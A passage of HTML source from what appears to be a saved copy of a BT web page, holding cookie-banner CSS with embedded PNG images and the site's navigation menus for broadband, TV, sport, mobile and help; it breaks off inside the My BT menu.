xMUU4QjJDRkFEQkJFN0ZGODQ2NiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PhXW7mkAAAIGSURBVHjaYmToYsAG2IA4AIoNgVgGKvYMiI8D8Xog3gjEv9A1MmIxMBCIQaIqDPjBHSAugxoOB0xIbGYg7gTidUQYxgBVsw6qhxlhiCtcQSfURlKBNRBzAPEeZBeGAnEpA/kA5JAQmIHsQNxHim5+dn6GHSE7GPTF9JGF+0ERxwJ1nQwphu0M3clgLmnOwM7CzuC4whEmBTIjFORCf2IN42PjY9gWvA1s2PW31xkiNkdgpBCQgXrEGMbDxsOwNXgrg5W0FcPNdzcZnFc6M7z8+hJdmQnIQCkYz1TClOFg5EEGYU5hFFVcrFxgw2xkbBhuv7/N4LTSieH51+fY7JVETocMXQ5dDHYydgy7QncxCHIIohgGEr/z/g7YsGdfnuH0CRM0O4FB2KYwhkuvLzEYiRuBDZXklmTYGLiRwUHWgeHeh3tgw558foIvZJ6Dst5qWBoCAVEuUYb94fsZtEW0Gb79/gZ24YOPDxgcVjgwPPz0kFBQr2WCZnI4eP3tNYPzKmeGG+9ugA179OkRg+NKR2IMA4H1IBeyQzM6SloEeXeJzxKG1J2pYO8SAUBhoQIrbcKAeCUDZQBkxmpYLK8C4h4KDOsGGYZe2uwDxQkoOZJo2BRowfIfvTz8C8RZ0Bi/Q4RBd6Bqc6F6cZbYsCogFFp6GwOxNFT8KRCfhZbSq7FVAQABBgBXO4qBIJwvQwAAAABJRU5ErkJggg=="); }
        .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__progressBarContainer___1ot8E .cookie-ui__progressBar___3-xny .cookie-ui__progressBarActive___1yk7c:before {
          background: green; }
        .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__progressBarContainer___1ot8E .cookie-ui__progressBar___3-xny li {
          list-style-type: none;
          width: calc(100% / 3);
          float: left;
          font-size: 12px;
          position: relative;
          top: -3px;
          text-align: center;
          text-transform: uppercase;
          color: #7d7d7d; }
          .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__progressBarContainer___1ot8E .cookie-ui__progressBar___3-xny li:before {
            width: 13px;
            height: 13px;
            position: relative;
            top: -2px;
            content: '';
            counter-increment: step;
            line-height: 30px;
            display: block;
            text-align: center;
            margin: 0 0px 10px auto;
            border-radius: 50%;
            background-color: #eee; }
          .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__progressBarContainer___1ot8E .cookie-ui__progressBar___3-xny li:after {
            width: 100%;
            height: 2px;
            content: '';
            position: absolute;
            background-color: #7d7d7d;
            top: 15px;
            left: -50%;
            z-index: -1; }
          .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__progressBarContainer___1ot8E .cookie-ui__progressBar___3-xny li:first-child:after {
            content: none; }
        .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__progressBarContainer___1ot8E .cookie-ui__progressBar___3-xny .cookie-ui__active___2C7Ac {
          color: green; }
        .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__progressBarContainer___1ot8E .cookie-ui__progressBar___3-xny .cookie-ui__activeItem___sXLVb + li:after {
          background-color: #55b776; }
    .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__section___17d3B {
      padding: 20px 20px 20px;
      position: relative; }
      .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__section___17d3B.cookie-ui__recommendedSection___2Lfas {
        background: lightgrey; }
  . .cookie-ui__btn___2YvnJ {
    display: inline-block;
    height: 40px;
    margin-right: 10px;
    border-radius: 5px;
    border: 1px solid #6400aa;
    min-width: 80px;
    background: white;
    color: #6400aa;
    font-family: 'bt_tvregular';
    font-size: 1em;
    padding: 1px 20px; }
    . .cookie-ui__btn___2YvnJ.cookie-ui__btnLeft___Dkofp {
      border-top-right-radius: 0px;
      border-bottom-right-radius: 0px;
      border-right: none;
      margin-right: 0px; }
    . .cookie-ui__btn___2YvnJ.cookie-ui__btnRight___wrN4x {
      border-top-left-radius: 0px;
      border-bottom-left-radius: 0px; }
    . .cookie-ui__btn___2YvnJ.cookie-ui__blue___Qenhk {
      background: #6400aa;
      color: white;
      border: none; }
  . .cookie-ui__popupImg___1H_Ep {
    width: 100%; }
  . .cookie-ui__bottomButtonContainer___3Vnjc {
    border-bottom-left-radius: 10px;
    border-bottom-right-radius: 10px;
    background: #efefef; }
    . .cookie-ui__bottomButtonContainer___3Vnjc .cookie-ui__bottomButtonInner___ySD3c {
      display: inline-block;
      margin: 20px; }
      . .cookie-ui__bottomButtonContainer___3Vnjc .cookie-ui__bottomButtonInner___ySD3c .cookie-ui__bottomButtonLink___lHbJF {
        color: #6400aa; }
        . .cookie-ui__bottomButtonContainer___3Vnjc .cookie-ui__bottomButtonInner___ySD3c .cookie-ui__bottomButtonLink___lHbJF:after {
          display: inline-block;
          content: '';
          width: 5px;
          height: 8px;
          margin: 0 5px;
          background-image: url("data:image/png;base64,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UmVhZHlxyWU8AAADfWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDAgNzkuMTYwNDUxLCAyMDE3LzA1LzA2LTAxOjA4OjIxICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOjhBQjE4MTdFQUQ5NTExRTY4MEIxOEJEOURBNDM0MjA5IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjgwMEI4ODAyRkQwRTExRTc4QUZBQTE2RUI2QTQ3RUIyIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjgwMEI4ODAxRkQwRTExRTc4QUZBQTE2RUI2QTQ3RUIyIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDQyAoTWFjaW50b3NoKSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjJhNjk4YzQ0LWI5NjItNDk0NS05YTY2LTVhY2RiYjFlYTUyMCIgc3RSZWY6ZG9jdW1lbnRJRD0iYWRvYmU6ZG9jaWQ6cGhvdG9zaG9wOjllYWQxYzE0LWE4ZTMtYmY0Zi05Y2Q0LTAwM2YzOTk1YjhlYiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqycnPAAAABmSURBVHjaYkxhWLWKgYFhARBvY4ACZiOG0NtAeikQPwfiKyBBFiC+AMQuQLwdiPmBeCYLVMctILYH4l1ALMDEgAr+AzETTFAViA8C8WQgbgdpNwDiTUBcBsQrYBZVAXEGspMAAgwAvUER2HpvhvYAAAAASUVORK5CYII="); }
        . .cookie-ui__bottomButtonContainer___3Vnjc .cookie-ui__bottomButtonInner___ySD3c .cookie-ui__bottomButtonLink___lHbJF.cookie-ui__noChevron___2FgfU:after {
          display: none; }
  . .cookie-ui__settings___DLalg {
    margin: 15px 0; }
  . .cookie-ui__item___klUq4 {
    display: flex;
    justify-content: space-between;
    padding: 5px 0; }
  . .cookie-ui__status___19p0s {
    font-weight: bold;
    font-family: 'bt_tvregular';
    color: #666; }
  . .cookie-ui__green___1B4cL {
    color: #008a00; }
</style><style>@media only screen and (max-width: 1199px) {  #bt-footer .bt-footer-inner-section {    max-width: 994px;  }}</style><style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}.nebula_image_button { width: auto !important; background: transparent !important; }</style></head>

<style>
@media only screen and (min-width: 900px) { 

#bt-navbar{

    position: relative;bottom: 6.5rem;width:102% !important;
    right:1rem

}

}

@media only screen and (max-width: 640px) { 

#bt-navbar{

    position: relative;bottom: 1.4rem;width:112% !important;
    right:1rem

}

.bt-navbar-bt-logo{

position: relative;
top:0.7rem

}

}


</style>

<body id="emailLogin" class="hasJS">
<div class="loading" style="display:none">
<span>
</span>
</div>
<div id="displayPage">
<div class="hideslot"> </div>
<div id="tv-section-page" class="container-fluid full-width">
<!--Dante New Global header started-->
<nav id="bt-navbar" style="visibility: visible;" class="full-width">
<div class="full-navbar"><div class="bt-navbar-universal-nav"><div class="bt-navbar-inner-section"><ul class="bt-navbar-universal-nav-menu-items"><li><a href="https://www.bt.com"> For the home</a></li><li><a href="https://business.bt.com/">For business and public sector</a></li><li><a href="https://www.globalservices.bt.com/uk/en/home">For global business</a></li></ul><span class="bt-navbar-universal-nav-separator">|</span> <span class="bt-navbar-universal-nav-region-selector"> <a href="http://www.globalservices.bt.com/LanguageUL.do?method=VIEW"> UK </a> <i class="dante-icon-chevron-right" aria-hidden="true"></i> </span></div></div><div class="bt-navbar-menu-container bt-navbar-global-nav" role="navigation"><div class="bt-navbar-inner-section"><div class="bt-navbar-menu bt-navbar-menu-main"><div class="bt-navbar-top-menu bt-navbar-left-menu"><a href="https://www.bt.com/"><img class="bt-navbar-bt-logo" src="logo-2018.svg" alt="BT logo"></a><ul class="left-nav-ul"><li class="bt-navbar-screen-xs-max-main"><a href="https://www.bt.com/broadband" aria-haspopup="true" aria-expanded="false"><span>Broadband</span></a><ul class="bt-navbar-dropdown bt-navbar-products-menu" aria-hidden="true" role="menu"> 
	<li class="bt-navbar-menu-col-40-percent">
		<div><a class="bt-navbar-chevron" href="https://www.bt.com/broadband/">Broadband</a></div> 
		<ul class="bt-navbar-menu-col-50-percent"> 
			<li><a href="https://www.bt.com/broadband/deals/">Broadband deals</a></li>
			<li><a href="https://www.bt.com/broadband/upgrade/">Upgrade broadband</a></li> 
			<li><a href="https://www.bt.com/tv/packages/">TV &amp; broadband</a></li> 
			<li><a href="https://www.bt.com/broadband/fibre/">Fibre broadband</a></li> 
			<li><a href="https://www.bt.com/broadband/full-fibre">Full Fibre broadband</a></li> 			
			<li><a href="https://www.shop.bt.com/broadband">Broadband accessories</a></li> 
		</ul>
		<ul class="bt-navbar-menu-col-50-percent">
			<li><a href="https://www.bt.com/broadband/complete-wifi">Complete Wi-Fi</a></li> 
			<li><a href="https://www.bt.com/broadband/extras/">Broadband extras</a></li> 			 
			<li><a href="https://www.bt.com/broadband/smart-hub/">Smart Hub</a></li> 
		</ul> 
	</li> 
	<li class="bt-navbar-menu-col-30-percent"> 
	<div><a class="bt-navbar-chevron" href="https://www.bt.com/landline/">Landline</a></div> 
		<ul class="bt-navbar-menu-col-50-percent"> 
			<li><a href="https://www.bt.com/landline/deals/">Landline deals</a></li>						
		</ul>
		<ul class="bt-navbar-menu-col-50-percent">	
            <li><a href="https://www.bt.com/landline/manage/">Manage landline</a></li> 
			<li><a href="https://www.bt.com/landline/calling-features/">Calling features</a></li> 
			<li><a href="https://www.bt.com/landline/calling-costs/">Calling costs</a></li>
			<li><a href="https://shop.bt.com/landline">Buy a home phone</a></li>
		</ul> 		
	</li>
	<li class="bt-navbar-menu-col-30-percent"> 
	<div><span>Switching to BT and Moving</span></div> 
		<ul> 
			<li><a href="https://www.bt.com/broadband/switch/">How to switch broadband</a></li> 
			<li><a href="https://www.bt.com/manage/moving-home/">Moving home</a></li>			
		</ul> 
	</li>			
</ul></li><li class="bt-navbar-screen-sm-main"><a href="https://www.bt.com/tv/" aria-haspopup="true" aria-expanded="false"><span>TV</span></a><ul class="bt-navbar-dropdown bt-navbar-bt-tv-menu" aria-hidden="true" role="menu">
    <li class="bt-navbar-menu-col-30-percent">
        <div><a class="bt-navbar-chevron" href="https://www.bt.com/tv/">TV</a></div>
        <ul>
            <li><a href="https://www.bt.com/tv/packages/">TV deals</a></li>
            <li><a href="https://www.bt.com/tv/add/">Add TV</a></li>
            <li><a href="https://www.bt.com/tv/about-tv ">About BT TV</a></li>
            <li><a href="https://www.bt.com/personalised-tv-packages">Change TV</a></li>
        </ul>
       </li>
    <li class="bt-navbar-menu-col-30-percent">
        <div><span>Switching to BT</span></div>
        <ul>
            <li><a href="https://www.bt.com/broadband/switch/">How to switch TV and broadband</a></li>
        </ul>
    </li>
    <li class="bt-navbar-menu-col-20-percent">
        <div><span>Find and watch TV</span></div>
        <ul>
            <li><a href="https://www.player.bt.com/#/livetv/fulltvlistings">TV Guide</a></li>
            <li><a href="https://www.bt.com/tv/best-of-tv/">Best of TV</a></li>
			<li><a href=" https://www.bt.com/tv/on-demand/now-tv/">NOW TV</a></li>
            <li><a href="https://www.bt.com/tv/on-demand/netflix/">Netflix</a></li>
            <li><a href="https://www.bt.com/tv/on-demand/amazon-prime-video/">Amazon Prime Video </a></li>
            <li><a href="https://www.player.bt.com/#/home">What's on</a></li>
            <li><a href="https://www.player.bt.com/#/tvstore">BT TV Store</a></li>
            <li><a href="https://www.player.bt.com/#/mytv/">TV purchases</a></li>
        </ul>
    </li>
    <li class="bt-navbar-menu-col-20-percent">
        <div><span>Find and watch sport</span></div>
        <ul>
            <li><a href="https://sport.bt.com/tv-guide-01363810618853">Sport TV Guide</a></li>
            <li><a href="https://sport.bt.com/live-on-bt-sport-01364117948039">Live on BT Sport</a></li>
            <li><a href="https://sport.bt.com/btsportplayer/bt-sport-1-01363810201090 ">BT Sport 1</a> </li>
            <li><a href="https://sport.bt.com/btsportplayer/bt-sport-2-01363810201819 ">BT Sport 2</a></li>
            <li><a href="https://sport.bt.com/btsportplayer/bt-sport-3-01363992468652 ">BT Sport 3</a></li>
            <li><a href="https://sport.bt.com/btsportplayer/espn-01363810201883 ">BT Sport / ESPN</a></li>
            <li><a href="https://sport.bt.com/btsportplayer/boxnation-01364145606295 ">BoxNation</a></li>
        </ul>
    </li>
</ul></li><li class="bt-navbar-screen-sm-main"><a href="https://sport.bt.com/" aria-haspopup="true" aria-expanded="false"><span class="">Sport </span></a><ul class="bt-navbar-dropdown bt-navbar-bt-sport-menu" aria-hidden="true" role="menu" style="display: none;" aria-expanded="false"> 
	<li class="bt-navbar-menu-col-20-percent">
		<div><a class="bt-navbar-chevron" href="https://www.bt.com/sport/">BT Sport Deals</a></div> 
			<ul style=""> 
				<li><a href="https://www.bt.com/sport/tv/">BT Sport on TV deals</a></li> 
				<li><a href="https://www.bt.com/sport/app/">BT Sport App</a></li> 
				<li><a href="https://www.bt.com/sport/sky/">BT Sport on Sky TV</a></li> <li><a href="https://www.bt.com/sport/packages/">BT Sport on Sky TV with BT Broadband</a></li> 
				<li><a href="https://www.bt.com/sport/monthly-pass/">BT Sport Monthly Pass</a></li> 
				<li><a href="https://www.bt.com/sport/bt-sport-ultimate/">BT Sport Ultimate</a></li> 
				<li><a href="https://shop.bt.com/sport">BT Sport accessories</a></li> 
			</ul> 
	</li> 
	<li class="bt-navbar-menu-col-30-percent"><div><span>Watch Live</span></div> 
		<ul class="bt-navbar-menu-col-50-percent" style=""> 
			<li><a href="https://sport.bt.com/btsportplayer/bt-sport-1-01363810201090">BT Sport 1</a></li> 
			<li><a href="https://sport.bt.com/btsportplayer/bt-sport-2-01363810201819">BT Sport 2</a></li> 
			<li><a href="https://sport.bt.com/btsportplayer/bt-sport-3-01363992468652">BT Sport 3</a></li> 
			<li><a href="https://sport.bt.com/btsportplayer/bt-sportespn-01363810201883">BT Sport / ESPN</a></li> 
			<li><a href="https://sport.bt.com/btsportplayer/boxnation-01364145606295">Box Nation</a></li> 
		</ul> 
		<ul class="bt-navbar-menu-col-50-percent" style="">
			<li><a href="https://www.bt.com/sport/box-office/">BT Sport Box Office</a></li>
			<li><a href="https://sport.bt.com/all-videos/videos-01364228997406">On Demand</a></li> 
			<li><a href="https://sport.bt.com/live-on-bt-sport-01364117948039">What's on</a></li> 
			<li><a href="https://sport.bt.com/tv-guide-01363810618853">TV Guide</a></li> 
		</ul> 
	</li> 
	<li class="bt-navbar-menu-col-30-percent">
		<div><a class="bt-navbar-chevron" href="https://sport.bt.com/">Sports videos and news</a></div> 	
			<ul class="bt-navbar-menu-col-50-percent" style=""> 
				<li><a href="https://sport.bt.com/football-01363810438492">Football</a></li> 
				<li><a href="https://sport.bt.com/boxing-01364050614609">Boxing</a></li> 
				<li><a href="https://sport.bt.com/motogp-01381782938496">MotoGP</a></li> 
				<li><a href="https://sport.bt.com/cricket-01364050608536">Cricket</a></li> 
			</ul> 
			<ul class="bt-navbar-menu-col-50-percent" style=""> 
				<li><a href="https://sport.bt.com/rugby-union-01363810542305">Rugby Union</a></li> 
				<li><a href="https://sport.bt.com/ufc-01376634170992">UFC</a></li> 
				<li><a href="https://sport.bt.com/wwe-01364411684388">WWE</a></li> 
				<li><a href="https://sport.bt.com/more-sport-01363810551131">More Sports</a></li> 
			</ul> 
	</li> 
<li class="bt-navbar-menu-col-16-percent"> <div><a class="bt-navbar-chevron" href="https://home.bt.com/login/loginform?TARGET=$SM$https%3A%2F%2Fsport%2Ebt%2Ecom">Log in to BT Sport</a></div> </li></ul></li><li class="bt-navbar-screen-sm-main"><a href="https://www.bt.com/mobile" aria-haspopup="true" aria-expanded="false"><span>Mobile</span></a><ul class="bt-navbar-dropdown bt-navbar-products-menu" aria-hidden="true" role="menu"> 
	<li class="bt-navbar-menu-col-60-percent"> 
		<div><a class="bt-navbar-chevron" href="https://www.bt.com/mobile/">Mobile</a></div> 
		<ul class="bt-navbar-menu-col-50-percent"> 
			<li><a href="https://www.bt.com/mobile/sim-only-deals/">SIM Only deals</a></li> 
			<li><a href="https://www.bt.com/mobile/family-sim/">Family SIM deals</a></li> 
			<li><a href="https://www.bt.com/mobile/phones/">Mobile phones</a></li> 
			<li><a href="https://www.bt.com/mobile/data-sim/">Data SIM Only deals</a></li> 
			<li><a href="https://www.bt.com/mobile/upgrade">Upgrade mobile</a></li>  
			<li><a href="https://shop.bt.com/mobile">Mobile accessories</a></li> 
		</ul> 
		<ul class="bt-navbar-menu-col-30-percent">  
			<li><a href="https://www.bt.com/mobile/about/">Mobile features</a></li> 
			<li><a href="https://www.bt.com/mobile/coverage-checker/">Coverage checker</a></li> 
			<li><a href="https://www.bt.com/mobile/data-roaming/">Data roaming</a></li> 
			<li><a href="https://www.bt.com/mobile/5g/">5G</a></li> 
			<li><a href="https://www.bt.com/halo/no-limits">No Limits</a></li>
		</ul> 
	</li> 
	<li class="bt-navbar-menu-col-40-percent"> 
		<div><a class="bt-navbar-chevron" href="https://www.bt.com/mobile/switch/">Switching to BT</a></div> 
		<ul> 
			<li><a href="https://www.bt.com/mobile/switch/">How to switch mobile</a></li> 
		</ul> 
	</li> 
</ul></li><li class="bt-navbar-screen-sm-main"><a href="https://www.bt.com/halo" aria-haspopup="true" aria-expanded="false"><span class="">Discover BT Halo</span></a></li></ul></div><div class="bt-navbar-top-menu bt-navbar-right-menu"><ul class="right-nav-ul"><li class="bt-navbar-screen-md-main"><a href="https://www.bt.com/help/home/" aria-haspopup="true" aria-expanded="false"><span class="">Help</span></a><ul class="bt-navbar-dropdown bt-navbar-help-menu" aria-hidden="true" role="menu" style="display: none;" aria-expanded="false">
    <li class="bt-navbar-menu-col-25-percent">
        <div><a class="bt-navbar-chevron" href="https://www.bt.com/help/">Help and support</a></div>
        <ul class="bt-navbar-menu-col-50-percent" style="">
            <li><a href="https://www.bt.com/help/">Help home</a></li>
            <li><a href="https://www.bt.com/help/broadband/">Broadband</a></li>
            <li><a href="https://www.bt.com/help/account-and-billing">Billing</a></li>
            <li><a href="https://www.bt.com/help/email/">Email</a></li>
            <li><a href="https://www.bt.com/help/tv/">TV</a></li>
        </ul>
        <ul class="bt-navbar-menu-col-50-percent" style="">
            <li><a href="https://www.bt.com/help/landline/">Landline</a></li>
            <li><a href="https://www.bt.com/help/security/">Security</a></li>
            <li><a href="https://www.bt.com/help/sport/">Sport</a></li>
            <li><a href="https://www.bt.com/help/mobile/">Mobile</a></li>
            <li><a href="https://www.bt.com/help/home/userguides/#/"> User guides </a> </li>
        </ul>
    </li>
    <li class="bt-navbar-menu-col-25-percent">
        <div><a class="bt-navbar-chevron" href="https://www.bt.com/faults">Fault tracking and repair</a></div>
        <ul style="">
            <li><a href="https://www.bt.com/faults">Raise a fault</a></li>
            <li><a href="https://support.bt.com/track/fault/?view=faulttracker">Track a fault</a></li>
        </ul>
    </li>
    <li class="bt-navbar-menu-col-35-percent">
        <div><span>Helpful links</span></div>
        <ul class="bt-navbar-menu-col-50-percent" style="">
            <li><a href="https://www.bt.com/help/servicestatus">Check service in your area</a></li>
            <li><a href="https://support.bt.com/fix/bbspeedtest/">Test your broadband speed</a></li>
            <li><a href="https://www.bt.com/buy-our-products/store-finder">Find a BT Store</a></li>
            <li><a href="https://www.bt.com/help/account-and-billing/usernames-and-passwords/i-can-t-log-in/help-with-bt-usernames-and-passwords/">Password help</a></li>
            <li><a href="https://www.bt.com/manage/moving-home/">Moving home help</a></li>
        </ul>
        <ul class="bt-navbar-menu-col-50-percent" style="">
            <li><a href="https://www.bt.com/appsordermgmt/public/index.do">Track your order</a></li>
            <li><a href="https://community.bt.com/">Ask the BT community</a></li>
            <li><a href="https://www.bt.com/help/home/newtobt.html">Getting started with your products</a></li>
        </ul>
    </li>
    <li class="bt-navbar-menu-col-15-percent">
        <div><a class="bt-navbar-chevron" href="https://www.bt.com/help/home/contactus/#/home">Get in touch</a></div>
        <ul style="">
            <li><a href="https://www.bt.com/help/home/contactus/#/home">Contact us</a></li>
            <li><a href="https://www.bt.com/help/home/complaints.html">Make a complaint</a></li>
            <li><a href="https://www.bt.com/help/home/scams/"> Report a scam call</a></li>
        </ul>
</li></ul>
</li><li class="bt-navbar-screen-md-main"><a href="https://home.bt.com/secure/loginforward?view=mybt&amp;redirectURL=https%3A%2F%2Fmy.bt.com%2Fmybt" aria-expanded="false"><span class="">My BT </span></a>
<ul class="bt-navbar-dropdown bt-navbar-my-bt-menu bt-navbar-my-bt-menu-out" aria-hidden="true" role="menu" style="display: none;" aria-expanded="false">
    <li class="bt-navbar-menu-col-20-percent">
<div><span>Your bills and usage</span></div>
        <ul style="">    
